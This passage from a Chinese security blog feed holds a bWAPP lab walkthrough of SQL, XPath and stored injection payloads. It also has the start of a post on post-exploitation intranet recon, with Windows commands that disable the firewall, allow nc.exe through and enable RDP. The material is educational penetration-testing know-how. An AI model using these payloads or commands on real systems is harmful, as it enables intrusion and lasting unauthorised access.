&amp;action=search//这里注意查询要放一个能成功查找到的title=Iron%&apos; and 1=2 # &amp;action=search//查询失败title=Iron%&apos; order by 8 # &amp;action=search</code></pre><h5 id="nbsp-nbsp-medium-and-high-1"><a href="#nbsp-nbsp-medium-and-high-1" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;和之前关卡一样无法绕过，因为 addslashes 和 mysql_real_escape_string 转义了字符，同时mysql编码无法进行宽字节绕过</p><h4 id="POST-Select"><a href="#POST-Select" class="headerlink" title="POST/Select"></a>POST/Select</h4><p>&nbsp;&nbsp;与get方式的payload一样</p><h4 id="AJAX-JSON-jQuery"><a href="#AJAX-JSON-jQuery" class="headerlink" title="AJAX/JSON/jQuery"></a>AJAX/JSON/jQuery</h4><h5 id="nbsp-nbsp-low-10"><a href="#nbsp-nbsp-low-10" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;通过在后台与服务器通信实现网页异步更新，实际上是通过 sqli_10-1 和 sqli_10-2 两个部分完成的，10-1对页面进行载入和数据的提交与格式化输出，而10-2则是与数据库进行交互的文件</p><p>&nbsp;&nbsp;可以通过对 sqli_10-1 输入框进行注入</p><p><img src="https://i.loli.net/2020/10/03/hJtNOEVurTy8jB5.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;或者也可以通过对 sqli_10-2 进行get的注入</p><p><img src="https://i.loli.net/2020/10/03/QkyGHpX19waKfDT.png" srcset="/img/loading.gif" alt=""></p><h5 id="nbsp-nbsp-medium-and-high-2"><a href="#nbsp-nbsp-medium-and-high-2" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;还是 addslashes 和 mysql_real_escape_string ，无法绕过</p><h4 id="Login-Form-Hero"><a href="#Login-Form-Hero" class="headerlink" title="Login Form/Hero"></a>Login Form/Hero</h4><h5 id="nbsp-nbsp-low-11"><a href="#nbsp-nbsp-low-11" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;输入用户名单引号出现报错</p><pre><code>用户名： 1&apos; or 1=1 #  //万能登陆</code></pre><h5 id="nbsp-nbsp-medium-and-high-3"><a href="#nbsp-nbsp-medium-and-high-3" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;还是 addslashes 和 mysql_real_escape_string ，无法绕过</p><h4 id="Login-Form-User"><a href="#Login-Form-User" class="headerlink" title="Login Form/User"></a>Login Form/User</h4><h5 id="nbsp-nbsp-low-12"><a href="#nbsp-nbsp-low-12" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;这关的通过是建立在使用默认知道登录密码的基础上</p><p>&nbsp;&nbsp;login处输入单引号报错，但是闭合后出现： Invalid credentials! </p><p>&nbsp;&nbsp;看看源码</p><pre><code>$login = $_POST[&quot;login&quot;];$login = sqli($login);$password = $_POST[&quot;password&quot;];$password = sqli($password);$password = hash(&quot;sha1&quot;, $password, false);//对输入字符串过滤，然后对password通过hash加密 $sql = &quot;SELECT * FROM users WHERE login = &apos;&quot; . $login . &quot;&apos;&quot;;//先从user表中查询用户是否存在$recordset = mysql_query($sql, $link);if(!$recordset)    {        die(&quot;Error: &quot; . mysql_error());    }    else    {        $row = mysql_fetch_array($recordset);        if($row[&quot;login&quot;] &amp;&amp; $password == $row[&quot;password&quot;])        //用户名密码匹配        {            // $message = &quot;&lt;font color=\&quot;green\&quot;&gt;Welcome &quot; . ucwords($row[&quot;login&quot;]) . &quot;...&lt;/font&gt;&quot;;            $message =  &quot;&lt;p&gt;Welcome &lt;b&gt;&quot; . ucwords($row[&quot;login&quot;]) . &quot;&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;&quot; . ucwords($row[&quot;secret&quot;]) . &quot;&lt;/b&gt;&lt;/p&gt;&quot;;            // $message = $row[&quot;login&quot;];            //输出相关信息和确认格式        }        else        {            $message = &quot;&lt;font color=\&quot;red\&quot;&gt;Invalid credentials!&lt;/font&gt;&quot;;        }    }</code></pre><p>&nbsp;&nbsp;正常输入</p><p><img src="https://i.loli.net/2020/10/07/fzmHEgrXUt5yDhP.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;因为注入payload无法通过order by来判断注入点，故只能通过union联合查询来判断select查询返回表的列数和返回表</p><pre><code>&apos; union select 1,2,3,4,5,6,7,8 #    //显示字段有误&apos; union select 1,2,3,4,5,6,7,8,9 #    //显示 Invalid credentials! ，证明返回9列</code></pre><p><img src="https://i.loli.net/2020/10/07/exkwsBjdqaluzUv.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;显示字段不匹配，由于之前从源码中知道有进行hash加密，将密码bug加密后挨个字段测试</p><pre><code>bee&apos; union select 1,2,&quot;6885858486f31043e5839c735d99457f045affd0&quot;,4,5,6,7,8,9 #bug//显示登录成功&apos; union select 1,2,&quot;6885858486f31043e5839c735d99457f045affd0&quot;,4,5,6,7,8,9 #bug//输入空则返回全部内容来比对</code></pre><p><img src="https://i.loli.net/2020/10/07/xtdH5PhcmsQ9DbR.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后就可以通过第五列来输出需要的信息了</p><pre><code>&apos; union select 1,2,&quot;6885858486f31043e5839c735d99457f045affd0&quot;,4,database(),6,7,8,9 #bug</code></pre><p><img src="https://i.loli.net/2020/10/07/xtdH5PhcmsQ9DbR.png" srcset="/img/loading.gif" alt=""></p><h5 id="nbsp-nbsp-medium-and-high-4"><a href="#nbsp-nbsp-medium-and-high-4" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;还是 addslashes 和 mysql_real_escape_string ，无法绕过</p><h4 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h4><h5 id="nbsp-nbsp-low-13"><a href="#nbsp-nbsp-low-13" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;输入单引号出现报错</p><pre><code>Error: HY000</code></pre><p>&nbsp;&nbsp;观察下查询中出现模糊查询，需要加上 %</p><p><img src="https://i.loli.net/2020/10/07/qzrPDp6QlhGZ31J.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;接下来操作就差不多了，查字段，查表</p><h5 id="nbsp-nbsp-medium-and-high-5"><a href="#nbsp-nbsp-medium-and-high-5" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;这次过滤了单引号</p><pre><code>function sqli_check_4($data){// Not bulletproof// Replaces a single quote (&apos;)$input = str_replace(&quot;&apos;&quot;, &quot;&apos;&apos;&quot;, $data);return $input;}</code></pre><h3 id="Drupal-SQL-Injection-Drupageddon"><a href="#Drupal-SQL-Injection-Drupageddon" class="headerlink" title="Drupal SQL Injection (Drupageddon)"></a>Drupal SQL Injection (Drupageddon)</h3><p>&nbsp;&nbsp;关卡提示了通过 CVE-2014-3704 ，msf启动即可。</p><h3 id="SQL-Injection-Stored"><a href="#SQL-Injection-Stored" class="headerlink" title="SQL Injection Stored"></a>SQL Injection Stored</h3><h4 id="Stored-Blog-1"><a href="#Stored-Blog-1" class="headerlink" title="Stored (Blog)"></a>Stored (Blog)</h4><h5 id="nbsp-nbsp-low-14"><a href="#nbsp-nbsp-low-14" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;输入单引号报错，随便输入一个测试一下</p><p><img src="https://i.loli.net/2020/10/07/o748HrDNcF26Ogv.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;一般这类都是insert语句</p><pre><code>insert语法格式：INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</code></pre><p>&nbsp;&nbsp;sql语句为：insert into blog(date,entry,owner) values(now(), ‘$entry’, ‘bee’);  entry变量为用户输入可控变量。</p><pre><code>payload：test&apos;,&apos;here&apos;)#</code></pre><p><img src="https://i.loli.net/2020/10/07/yMsFOcuKBSoi8Gv.png" srcset="/img/loading.gif" alt=""></p><pre><code>判断数据库：test&apos;, (select database())) #</code></pre><p><img src="https://i.loli.net/2020/10/07/9UPmOubkc48iEae.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;同时也可以打xss进去</p><h5 id="nbsp-nbsp-medium-and-high-6"><a href="#nbsp-nbsp-medium-and-high-6" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;medium用addslashes来过滤，high用mysqli_real_escape_string来过滤，但还是可以打xss</p><h4 id="Stored-SQLite"><a href="#Stored-SQLite" class="headerlink" title="Stored (SQLite)"></a>Stored (SQLite)</h4><p>&nbsp;&nbsp;总体和上一关类似，注意注释为 – </p><h4 id="Stored-User-Agent"><a href="#Stored-User-Agent" class="headerlink" title="Stored (User-Agent)"></a>Stored (User-Agent)</h4><h5 id="nbsp-nbsp-low-15"><a href="#nbsp-nbsp-low-15" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;sql语句为：INSERT INTO blog (date, user_agent, ip_address) VALUES(now(), ‘$user-agent’,’$ip’);</p><p>&nbsp;&nbsp;burpsuite抓包修改User-Agent</p><p><img src="https://i.loli.net/2020/10/07/Fm4ghsMZfHWjq3J.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;修改结果</p><p><img src="https://i.loli.net/2020/10/07/ImWb2MofGtRZvlT.png" srcset="/img/loading.gif" alt=""></p><h5 id="nbsp-nbsp-medium-and-high-7"><a href="#nbsp-nbsp-medium-and-high-7" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;medium用addslashes来过滤，high用mysqli_real_escape_string来过滤</p><h4 id="Stored-XML"><a href="#Stored-XML" class="headerlink" title="Stored (XML)"></a>Stored (XML)</h4><p>&nbsp;&nbsp;靶场跑不起来 - -</p><h3 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection Blind"></a>SQL Injection Blind</h3><h4 id="Blind-Boolean-Based"><a href="#Blind-Boolean-Based" class="headerlink" title="Blind - Boolean-Based"></a>Blind - Boolean-Based</h4><h5 id="nbsp-nbsp-low-16"><a href="#nbsp-nbsp-low-16" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;输入正确只能显示存在或不存在</p><p>&nbsp;&nbsp;由于判断是字符型注入，需要加上引号</p><pre><code>Iron Man&apos; and &apos;1&apos;=&apos;1  //显示存在Iron Man&apos; and &apos;1&apos;=&apos;2  //显示不存在</code></pre><p>&nbsp;&nbsp;测试一下数据库名长度</p><pre><code>Iron Man&apos; and length(database())=5 #</code></pre><p>b45</p><h5 id="nbsp-nbsp-medium-and-high-8"><a href="#nbsp-nbsp-medium-and-high-8" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;还是 addslashes 和 mysql_real_escape_string ，无法绕过</p><h4 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time-Based"></a>Time-Based</h4><h5 id="nbsp-nbsp-low-17"><a href="#nbsp-nbsp-low-17" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>b46</p><p>&nbsp;&nbsp;无论输入什么，都是这个结果，需要通过盲注测试</p><p>&nbsp;&nbsp;需要通过sleep函数</p><pre><code>Iron Man&apos; and sleep(if((1=1), 0, 3)) # //没有延迟Iron Man&apos; and sleep(if((1=2), 0, 3)) # //延迟3sIron man&apos; and if(1=0,1, sleep(10)) # //延迟10s</code></pre><h5 id="nbsp-nbsp-medium-and-high-9"><a href="#nbsp-nbsp-medium-and-high-9" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;还是 addslashes 和 mysql_real_escape_string ，无法绕过</p><h4 id="Blind-SQLite"><a href="#Blind-SQLite" class="headerlink" title="Blind (SQLite)"></a>Blind (SQLite)</h4><p>&nbsp;&nbsp;具体操作和sql类似，注意注释为 –</p><h3 id="XML-XPath-Injection"><a href="#XML-XPath-Injection" class="headerlink" title="XML/XPath Injection"></a>XML/XPath Injection</h3><h4 id="Login-Form"><a href="#Login-Form" class="headerlink" title="Login Form"></a>Login Form</h4><h5 id="nbsp-nbsp-low-18"><a href="#nbsp-nbsp-low-18" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;用户名后输入单引号，出现报错</p><p>b48</p><p>&nbsp;&nbsp;看看源码</p><pre><code>// Loads the XML file$xml = simplexml_load_file(&quot;passwords/heroes.xml&quot;);// XPath search$result = $xml-&gt;xpath(&quot;/heroes/hero[login=&apos;&quot; . $login . &quot;&apos; and password=&apos;&quot; . $password . &quot;&apos;]&quot;);//先通过simplexml_load_file函数载入xml文件，xml内是登录账号，再通过xpath来将xml内的账号和输入账号密码比较//构造payload ： xxx&apos; or 1=1 or &apos;&apos;=&apos;</code></pre><p>b47</p><h5 id="nbsp-nbsp-medium-and-high-10"><a href="#nbsp-nbsp-medium-and-high-10" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;源码中过滤大部分能操作的字符</p><pre><code>function xmli_check_1($data){// Replaces dangerous characters: ( ) = &apos; [ ] : , * / WHITESPACE$input = str_replace(&quot;(&quot;, &quot;&quot;, $data);$input = str_replace(&quot;)&quot;, &quot;&quot;, $input);$input = str_replace(&quot;=&quot;, &quot;&quot;, $input);$input = str_replace(&quot;&apos;&quot;, &quot;&quot;, $input);$input = str_replace(&quot;[&quot;, &quot;&quot;, $input);$input = str_replace(&quot;]&quot;, &quot;&quot;, $input);$input = str_replace(&quot;:&quot;, &quot;&quot;, $input);$input = str_replace(&quot;,&quot;, &quot;&quot;, $input);$input = str_replace(&quot;*&quot;, &quot;&quot;, $input);$input = str_replace(&quot;/&quot;, &quot;&quot;, $input);$input = str_replace(&quot; &quot;, &quot;&quot;, $input);return $input;}</code></pre><h4 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h4><h5 id="nbsp-nbsp-low-19"><a href="#nbsp-nbsp-low-19" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;电影类型后输入单引号，出现报错</p><p>b49</p><p>&nbsp;&nbsp;看看源码</p><pre><code>// Loads the XML file$xml = simplexml_load_file(&quot;passwords/heroes.xml&quot;);// XPath search// $result = $xml-&gt;xpath(&quot;//hero[genre = &apos;$genre&apos;]/movie&quot;);$result = $xml-&gt;xpath(&quot;//hero[contains(genre, &apos;$genre&apos;)]/movie&quot;);//contains(str1,str2)函数用来判断str2是否是第一个字符串的一部分。</code></pre>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2020/08/18/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2020/08/18/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><h3 id="nbsp-nbsp-手动收集"><a href="#nbsp-nbsp-手动收集" class="headerlink" title="&nbsp;&nbsp;手动收集"></a>&nbsp;&nbsp;手动收集</h3><h4 id="nbsp-nbsp-nbsp-nbsp-查询操作系统和版本信息"><a href="#nbsp-nbsp-nbsp-nbsp-查询操作系统和版本信息" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询操作系统和版本信息"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询操作系统和版本信息</h4><pre><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code></pre><p><img src="https://i.loli.net/2020/08/26/VTpqd8njIeClOZc.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;在中文系统中时候后面的命令才有显示</p><h4 id="nbsp-nbsp-nbsp-nbsp-查看系统体系结构"><a href="#nbsp-nbsp-nbsp-nbsp-查看系统体系结构" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查看系统体系结构"></a>&nbsp;&nbsp;&nbsp;&nbsp;查看系统体系结构</h4><pre><code>echo %PROCESSOR_ARCHITECTURE%</code></pre><p><img src="https://i.loli.net/2020/08/26/LMDsCWP5zKcUk4b.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查看安装的软件及版本、路径等"><a href="#nbsp-nbsp-nbsp-nbsp-查看安装的软件及版本、路径等" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查看安装的软件及版本、路径等"></a>&nbsp;&nbsp;&nbsp;&nbsp;查看安装的软件及版本、路径等</h4><pre><code>wmic product get name,version</code></pre><p><img src="https://i.loli.net/2020/08/26/xDgosX9hrtf3zkY.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-使用powershell命令，搜集软件的版本信息"><a href="#nbsp-nbsp-nbsp-nbsp-使用powershell命令，搜集软件的版本信息" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;使用powershell命令，搜集软件的版本信息"></a>&nbsp;&nbsp;&nbsp;&nbsp;使用powershell命令，搜集软件的版本信息</h4><pre><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></pre><p><img src="https://i.loli.net/2020/08/26/phWzbNcPkOCBsJ3.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查询本机服务信息"><a href="#nbsp-nbsp-nbsp-nbsp-查询本机服务信息" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询本机服务信息"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询本机服务信息</h4><pre><code>wmic service list brief</code></pre><p><img src="https://i.loli.net/2020/08/26/1hnilNuesK4DpOv.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查询进程列表"><a href="#nbsp-nbsp-nbsp-nbsp-查询进程列表" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询进程列表"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询进程列表</h4><pre><code>tasklist</code></pre><p>&nbsp;&nbsp;查看当前进程列表和进程用户、分析软件、邮件客户端、vpn和杀毒软件等进程</p><pre><code>wmic process list brief</code></pre><p><img src="https://i.loli.net/2020/08/26/61nK2UEVB9bANRF.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查看启动程序信息"><a href="#nbsp-nbsp-nbsp-nbsp-查看启动程序信息" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查看启动程序信息"></a>&nbsp;&nbsp;&nbsp;&nbsp;查看启动程序信息</h4><pre><code>wmic startup get command,caption</code></pre><p><img src="https://i.loli.net/2020/08/26/eocD6f8swNOU5b1.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查看计划任务"><a href="#nbsp-nbsp-nbsp-nbsp-查看计划任务" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查看计划任务"></a>&nbsp;&nbsp;&nbsp;&nbsp;查看计划任务</h4><pre><code>chcp 437   将文字转化为英文显示schtasks /query /fo LIST /v</code></pre><p><img src="https://i.loli.net/2020/08/26/z6mDnZSYbouh4MT.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;若直接使用schasks命令则会出现提示列资源无法加载</p><h4 id="nbsp-nbsp-nbsp-nbsp-查看主机开机时间"><a href="#nbsp-nbsp-nbsp-nbsp-查看主机开机时间" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查看主机开机时间"></a>&nbsp;&nbsp;&nbsp;&nbsp;查看主机开机时间</h4><pre><code>net statistics workstation</code></pre><p><img src="https://i.loli.net/2020/08/26/LWj3nag1cG4TS6H.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查询用户列表"><a href="#nbsp-nbsp-nbsp-nbsp-查询用户列表" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询用户列表"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询用户列表</h4><pre><code>net user</code></pre><p><img src="https://i.loli.net/2020/08/26/rhC5WvpJVEkNa4l.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;通过分析本机用户列表，可以找出内网机器的命名规则，用来推测整个域的用户命名方式。</p><p>&nbsp;&nbsp;获取本地管理员信息</p><pre><code>net localgroup administrators</code></pre><p><img src="https://i.loli.net/2020/08/26/MR8DbGXHLEtOuys.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;查看当前在线用户</p><pre><code>query user || qwinsta</code></pre><p><img src="https://i.loli.net/2020/08/26/1TfbJtosx6U5GXr.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-列出或断开本地计算机与所连接的客户端之间的会话"><a href="#nbsp-nbsp-nbsp-nbsp-列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;列出或断开本地计算机与所连接的客户端之间的会话"></a>&nbsp;&nbsp;&nbsp;&nbsp;列出或断开本地计算机与所连接的客户端之间的会话</h4><pre><code>net session</code></pre><p><img src="https://i.loli.net/2020/08/26/ZmVJ3KM9FHdNUAX.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查询端口列表"><a href="#nbsp-nbsp-nbsp-nbsp-查询端口列表" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询端口列表"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询端口列表</h4><pre><code>netstat -ano</code></pre><p><img src="https://i.loli.net/2020/08/26/zsA3dVIHulQ2Z1y.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;此时可以看到当前机器和哪些主机建立了连接，以及TCP、UDP等端口的使用和监听情况。</p><h4 id="nbsp-nbsp-nbsp-nbsp-查询补丁信息"><a href="#nbsp-nbsp-nbsp-nbsp-查询补丁信息" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询补丁信息"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询补丁信息</h4><pre><code>systeminfo</code></pre><p><img src="https://i.loli.net/2020/08/26/4C6fqSpA1hm7Dcw.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;需要注意系统的版本、补丁信息和更新频率</p><pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><p><img src="https://i.loli.net/2020/08/26/gxkprnvOQYfXwZH.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;补丁的名称、描述、ID等</p><h4 id="nbsp-nbsp-nbsp-nbsp-查询本机共享列表"><a href="#nbsp-nbsp-nbsp-nbsp-查询本机共享列表" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询本机共享列表"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询本机共享列表</h4><pre><code>net share</code></pre><p><img src="https://i.loli.net/2020/08/26/zFEX7ToHqhO8vge.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;查看本机共享列表和可访问的域共享列表</p><pre><code>wmic share get name,path,status</code></pre><p><img src="https://i.loli.net/2020/08/26/oumsYMgqSDCVftz.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查询路由表及所有可用接口的ARP缓冲表"><a href="#nbsp-nbsp-nbsp-nbsp-查询路由表及所有可用接口的ARP缓冲表" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询路由表及所有可用接口的ARP缓冲表"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询路由表及所有可用接口的ARP缓冲表</h4><pre><code>route printarp -a</code></pre><p><img src="https://i.loli.net/2020/08/26/StEeGpB5PxHnuOJ.png" srcset="/img/loading.gif" alt=""></p><h4 id="nbsp-nbsp-nbsp-nbsp-查询防火墙相关配置"><a href="#nbsp-nbsp-nbsp-nbsp-查询防火墙相关配置" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询防火墙相关配置"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询防火墙相关配置</h4><p>&nbsp;&nbsp;（1）关闭防火墙</p><pre><code>win 2003及之前的版本用这条命令：netsh firewall set opmode disablewin 2003之后的版本用这条命令：netsh advfirewall set allprofiles state off</code></pre><p>&nbsp;&nbsp;（2）查看防火墙配置</p><pre><code>netsh firewall show config</code></pre><p><img src="https://i.loli.net/2020/08/26/tClHTzeQuJOvYNA.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;（3）修改防火墙配置</p><pre><code>win 2003及之前的版本，运行指定程序全部连接：netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enablewin 2003之后的版本用这条：netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;允许指定程序连出，命令如下netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;允许 3389 端口放行，命令如下netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow自定义防火墙日志储存位置netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></pre><h4 id="nbsp-nbsp-nbsp-nbsp-查看代理配置情况"><a href="#nbsp-nbsp-nbsp-nbsp-查看代理配置情况" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查看代理配置情况"></a>&nbsp;&nbsp;&nbsp;&nbsp;查看代理配置情况</h4><pre><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></pre><p><img src="https://i.loli.net/2020/08/26/JMcWiNFzK3pHsP1.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;可以看到服务器1080端口配置信息</p><h4 id="nbsp-nbsp-nbsp-nbsp-查询并开启远程连接服务"><a href="#nbsp-nbsp-nbsp-nbsp-查询并开启远程连接服务" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;查询并开启远程连接服务"></a>&nbsp;&nbsp;&nbsp;&nbsp;查询并开启远程连接服务</h4><p>&nbsp;&nbsp;（1）查看远程连接端口</p><pre><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></pre><p><img src="https://i.loli.net/2020/08/26/L7nrAVemwbCM2Fp.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;在cmd下使用注册表查询语句，得到连接端口为0xd3d，转换后为3389</p><p>&nbsp;&nbsp;（2）在 Windows Server 2003 中开启 3389 端口</p><pre><code>wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1</code></pre><p>&nbsp;&nbsp;（3）在Windows Server 2008和Windows Server 2012中开启3389端口</p><pre><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre><h3 id="nbsp-nbsp-自动收集信息"><a href="#nbsp-nbsp-自动收集信息" class="headerlink" title="&nbsp;&nbsp;自动收集信息"></a>&nbsp;&nbsp;自动收集信息</h3><p>&nbsp;&nbsp;使用WMIC自动脚本来收集信息,打开运行wmic_info.bat会自动生成一个 out.html文件</p><p><img src="https://i.loli.net/2020/08/26/VXC2J43ATSxNuit.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;同样也可以使用工具 <strong>Empire</strong> </p><pre><code>git clone https://github.com/EmpireProject/Empire.git</code></pre><h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><h3 id="nbsp-nbsp-查看当前权限"><a href="#nbsp-nbsp-查看当前权限" class="headerlink" title="&nbsp;&nbsp;查看当前权限"></a>&nbsp;&nbsp;查看当前权限</h3><p>&nbsp;&nbsp;查看当前权限</p><pre><code>whoami</code></pre><p>&nbsp;&nbsp;获取当前主机权限后，有三种情况：①本地普通用户，②本地管理员用户，③域内用户</p><p><img src="https://i.loli.net/2020/08/26/ecAXm3BzrDR2WKj.png" srcset="/img/loading.gif" 